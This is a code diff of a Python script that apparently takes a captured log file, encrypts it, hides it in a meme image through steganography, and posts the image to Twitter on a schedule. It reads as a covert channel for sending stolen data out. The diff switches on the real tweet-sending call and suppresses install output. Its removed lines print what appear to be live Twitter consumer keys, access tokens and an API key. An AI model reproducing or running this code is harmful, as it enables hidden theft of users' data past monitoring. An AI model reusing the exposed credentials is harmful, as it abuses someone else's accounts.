@@ -12,7 +12,12 @@ except ImportError:
     os.system('sudo apt install python3-venv python3-pip')
 
 def install(package):
-    subprocess.check_call([sys.executable, "-m", "pip", "install", package])
+    with open(os.devnull, 'w')  as FNULL:
+        try:
+            subprocess.check_call([sys.executable, "-m", "pip", "install", package],stdout=FNULL,stderr=FNULL)
+        except subprocess.CalledProcessError:
+            # Do something
+            print("error")
 
 try:
     import tweepy
@@ -44,33 +49,36 @@ except ImportError:
     import tweepy
 
 def DownloadTrendingImages():
-    API_KEY = "c4b739c3-442e-49c2-ac44-f5ad6b0e37e3"
     headers = {'Content-Type': 'application/json'}
-    api_url = "http://version1.api.memegenerator.net//Generators_Select_ByTrending?apiKey=" + API_KEY    
+    api_url = config["MEME_GET_URL"]  
     response = requests.get(api_url, headers=headers)
 
     if response.status_code == 200:
         content = json.loads(response.content.decode('utf-8'))
-        return content["result"]
+        memes = content["data"]
+        return memes["memes"]
     else:
         return None
 
 def getImage():
-    ImageSize = "600x600" 
     ImageSet = DownloadTrendingImages()
-    ImageSet_Size = len(ImageSet)
+    ImageSize = int(config["IMAGE_SIZE"])
+    #filter for correct image size
+    newImageSet = []
+    for image in ImageSet:
+        if image["height"] >= ImageSize and image["width"] >= ImageSize:
+            newImageSet.append(image)
+
+    ImageSet_Size = len(newImageSet)
 
     #get one image
     if ImageSet_Size >= 1:
-        Image = random.choice(ImageSet)
+        Image = random.choice(newImageSet)
     else:
         #No image not returned
         Image = None
-
     #image url
-    url = Image["imageUrl"]
-    index_of_last_slash = url.rfind("/")
-    url = url[:index_of_last_slash+1] + ImageSize + "/" + url[index_of_last_slash+1:]
+    url = Image["url"]
 
     response = requests.get(url)
     if response.status_code == 200:
@@ -103,10 +111,10 @@ def cleanup(files):
 
 # tweet image
 def tweetSetup():
-    consumer_key = '94lE6CQUO1NcpfGUjbY7a2D32'
-    consumer_key_secret = 'BSkoyZTEIm3oMIPvLWSOcCqnFd0w9n1WagP0SY43ztGxI8cOlz'
-    access_token = '1265315199197736960-WCposgyu6MQ3y1hlAJj8enfRbwyLBI'
-    access_token_secret = 'oJ9K73Fw3E5GZiAB9ftqvlGsopbexqi2n2OoYISxjqfdA'
+    consumer_key = config["TWITTER_CONSUMER_KEY"]
+    consumer_key_secret = config["TWITTER_CONSUMER_KEY_SECRET"]
+    access_token = config["TWITTER_ACCESS_TOKEN"]
+    access_token_secret = config["TWITTER_ACCESS_TOKEN_SECRET"]
 
     auth = tweepy.OAuthHandler(consumer_key, consumer_key_secret)
     auth.set_access_token(access_token, access_token_secret)
@@ -133,6 +141,8 @@ def sendStegoTweet():
     NewImagePath = './{}_new.png'.format(image_name)
 
     JPEG_IMG = getImage()
+    ImageSize = int(config["IMAGE_SIZE"])
+    JPEG_IMG = JPEG_IMG.resize((ImageSize,ImageSize))
     JPEG_IMG.save(ImagePath)
     PNG_IMAGE = PIL.Image.open(ImagePath)
     width, height = PNG_IMAGE.size
@@ -140,7 +150,7 @@ def sendStegoTweet():
 
     logged_file = "log_file_analyzed.txt"
     encrypted_file = "encrypted.txt"
-    password = "password"
+    password = config["AES_PASSWORD"]
 
     encrypt(password, logged_file, encrypted_file)
 
@@ -192,17 +202,33 @@ def check_analyzed_log_file():
     else:
         return False
 
+
+#returns a dictionary key value pair
+#containing configuration data
+def getConfig():
+    config = {} 
+    with open('config','r') as config_file: 
+        for line in config_file:
+            if line == '\n':
+                continue
+            line = line.replace("="," ")
+            pairs = line.split()
+            key = pairs[0]
+            value = pairs[1]
+            config[key] = value
+    return config
+
+
 def main_scheduler(): 
-    minutes = 30   
+    minutes = int(config["SCHEDULER_MINUTE_CYCLE"])
     REPEAT_EVERY = 60 * minutes # secs/min * minutes
     while True:
-        
+        print(config.values())
         #first we retrieve log file from /proc/buffer_file
         #check if enough data in log file. if yes continue, if not try again in 30 mins
 
         #if continue to next phase retrieve procfile and analyse data 
         #check if enough data in analysed log file. if yes continue to tweet, if not try again in 30 mins
-
         should_continue_to_tweet = check_log_file() 
         
 
@@ -212,9 +238,13 @@ def main_scheduler():
         if(should_continue_to_tweet):
             print("stego tweet sent")
             #uncomment for actually sending tweet
-            #sendStegoTweet()
+            sendStegoTweet()
+        else:
+            print("not tweet")
 
         time.sleep(REPEAT_EVERY)    
 
+
+config = getConfig()
 main_scheduler()
     
